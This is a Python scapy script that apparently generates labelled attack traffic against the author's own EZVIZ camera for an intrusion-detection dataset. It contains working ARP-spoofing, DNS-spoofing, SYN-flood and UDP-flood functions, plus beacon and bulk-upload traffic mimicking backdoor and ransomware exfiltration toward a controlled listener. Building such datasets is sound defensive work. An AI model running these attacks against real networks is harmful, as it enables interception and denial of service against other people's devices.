"""
NEXA - IoT Camera Attack Traffic Generator
Target: EZVIZ CS-TY1 camera on your own private ICS network ONLY.

SCOPE: Only run against 192.168.137.<camera_ip>, a device you own,
on a network you control. Do not point any function here at another host.

Requires: pip install scapy
Run as Administrator (raw packet send/recv needs it on Windows).

Usage: edit CAM_IP / CAM_MAC / GATEWAY_IP below, then run one function
at a time from the __main__ block - not all attacks at once.
"""

from scapy.all import *
import time
import socket
import random

# ============================================================
# CONFIG - edit these
# ============================================================
IFACE       = "Ethernet"
CAM_IP      = "192.168.137.73"       # <-- set from arp -a
CAM_MAC     = "0c:a6:4c:70:1d:6b"
GATEWAY_IP  = "192.168.137.1"         # your laptop, the real gateway
MY_MAC      = get_if_hwaddr(IFACE)


# ============================================================
# 1. MITM - ARP spoofing
# Real technique: forges ARP replies so the camera sends its
# traffic to your laptop's MAC thinking it's the gateway.
# ============================================================
def mitm_arp_spoof(duration_sec=90, interval=2):
    print(f"[MITM] ARP spoofing {CAM_IP} for {duration_sec}s ...")
    end_time = time.time() + duration_sec
    try:
        while time.time() < end_time:
            # Tell the camera: "I am the gateway"
            pkt_to_cam = ARP(op=2, pdst=CAM_IP, hwdst=CAM_MAC, psrc=GATEWAY_IP)
            # Send at L2: wrap the ARP reply in an Ethernet frame to the camera.
            # scapy 2.8's L3 send(iface=...) can't interface-select a bare ARP pkt.
            sendp(Ether(dst=CAM_MAC) / pkt_to_cam, verbose=False, iface=IFACE)
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    print("[MITM] stopped.")


# ============================================================
# 2. MITM - DNS spoofing (no ARP layer involved)
# Sniffs the camera's DNS queries and races a forged response
# back before the real server answers. Cleaner IP/UDP-layer
# signature for flow-based pipelines than ARP spoofing.
# ============================================================
def mitm_dns_spoof(duration_sec=90, redirect_to=None):
    redirect_to = redirect_to or GATEWAY_IP
    print(f"[MITM-DNS] Spoofing DNS responses to {CAM_IP} -> {redirect_to} for {duration_sec}s ...")

    def handle(pkt):
        if pkt.haslayer(DNSQR) and pkt[IP].src == CAM_IP:
            qname = pkt[DNSQR].qname
            spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=qname, ttl=10, rdata=redirect_to))
            send(spoofed, verbose=False, iface=IFACE)
            print(f"  spoofed answer for {qname.decode(errors='ignore')}")

    sniff(iface=IFACE, filter=f"udp port 53 and src host {CAM_IP}",
          prn=handle, timeout=duration_sec)
    print("[MITM-DNS] stopped.")


# ============================================================
# 3. DoS - SYN flood (real half-open TCP flood)
# ============================================================
def dos_syn_flood(port=554, duration_sec=60):
    print(f"[DoS] SYN flood on {CAM_IP}:{port} for {duration_sec}s ...")
    end_time = time.time() + duration_sec
    pkt = IP(dst=CAM_IP) / TCP(sport=RandShort(), dport=port, flags="S")
    try:
        while time.time() < end_time:
            send(pkt, verbose=False, iface=IFACE)
    except KeyboardInterrupt:
        pass
    print("[DoS] stopped.")


# ============================================================
# 4. DoS - UDP flood
# ============================================================
def dos_udp_flood(port=3702, duration_sec=60, payload_size=1000):
    print(f"[DoS] UDP flood on {CAM_IP}:{port} for {duration_sec}s ...")
    end_time = time.time() + duration_sec
    payload = Raw(b"\x00" * payload_size)
    pkt = IP(dst=CAM_IP) / UDP(sport=RandShort(), dport=port) / payload
    try:
        while time.time() < end_time:
            send(pkt, verbose=False, iface=IFACE)
    except KeyboardInterrupt:
        pass
    print("[DoS] stopped.")


# ============================================================
# 5. "Backdoor" class - traffic SIGNATURE only, no actual backdoor.
# Real backdoors show up on the wire as periodic, low-volume
# outbound connections to a fixed host/port (a beacon). This
# generates that *shape* of traffic against a host YOU control,
# for labeling - it does not install, exploit, or persist anything.
# ============================================================
def backdoor_beacon_signature(listener_ip, port=4444, beacons=20, interval_sec=30):
    """
    listener_ip: an IP you control (e.g. a VM on your own network)
    that is ALSO yours - this just produces a periodic-connection
    shape, it is not contacting the camera at all.
    """
    print(f"[Backdoor-sig] periodic beacon to {listener_ip}:{port}, "
          f"{beacons} beacons every {interval_sec}s ...")
    for i in range(beacons):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((listener_ip, port))
            s.close()
            print(f"  beacon {i+1}/{beacons} sent")
        except Exception as e:
            print(f"  beacon {i+1}/{beacons} failed: {e}")
        time.sleep(interval_sec)
    print("[Backdoor-sig] done.")


# ============================================================
# 6. "Ransomware" class - traffic SIGNATURE only, no payload.
# Network-flow datasets generally label "ransomware" by its
# C2/exfil traffic shape: a burst of outbound connections to one
# external host carrying noticeably larger payloads than normal
# heartbeat traffic. This reproduces that shape against a host
# YOU control. It does not encrypt anything or touch the camera's
# filesystem (which you have no access to anyway).
# ============================================================
def ransomware_exfil_signature(listener_ip, port=8443, bursts=50, payload_kb=50):
    print(f"[Ransomware-sig] burst exfil-shaped traffic to {listener_ip}:{port} ...")
    payload = bytes(payload_kb * 1024)
    for i in range(bursts):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((listener_ip, port))
            s.sendall(payload)
            s.close()
            print(f"  burst {i+1}/{bursts} sent ({payload_kb} KB)")
        except Exception as e:
            print(f"  burst {i+1}/{bursts} failed: {e}")
        time.sleep(random.uniform(0.5, 2))
    print("[Ransomware-sig] done.")


# ============================================================
# Simple listener to pair with #5 / #6 - run this on a second
# machine/VM you own, so the beacon/burst connections succeed
# cleanly rather than failing instantly.
# ============================================================
def simple_listener(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(5)
    print(f"[Listener] on 0.0.0.0:{port}, Ctrl+C to stop")
    try:
        while True:
            conn, addr = s.accept()
            data = conn.recv(65536)
            print(f"  connection from {addr}, {len(data)} bytes")
            conn.close()
    except KeyboardInterrupt:
        pass
    s.close()


if __name__ == "__main__":
    # Run ONE of these at a time. Start your dumpcap capture first,
    # wait a few seconds, then uncomment and run the one you need.

    #mitm_arp_spoof(duration_sec=60)
    mitm_dns_spoof(duration_sec=60)
    # dos_syn_flood(duration_sec=60)
    # dos_udp_flood(duration_sec=60)
    # backdoor_beacon_signature(listener_ip="192.168.137.1", port=4444)
    # ransomware_exfil_signature(listener_ip="192.168.137.1", port=8443)
    # simple_listener(port=4444)

    print("Edit the __main__ block to uncomment the attack you want to run.")